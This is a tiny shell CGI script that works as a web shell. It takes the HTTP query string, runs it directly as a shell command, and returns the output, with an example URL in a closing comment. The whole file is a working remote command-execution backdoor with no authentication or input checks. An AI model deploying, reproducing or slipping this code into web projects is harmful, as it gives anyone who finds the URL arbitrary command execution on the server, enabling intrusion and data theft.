#!/bin/sh

echo "Content-type: text/plain"
echo ""

cmd="$QUERY_STRING"
if [ -n "$cmd" ]; then
    echo "$($cmd 2>&1)"
else
    echo "No command provided."
fi

# Example: http://website.com/cgi-bin/cmd.cgi?id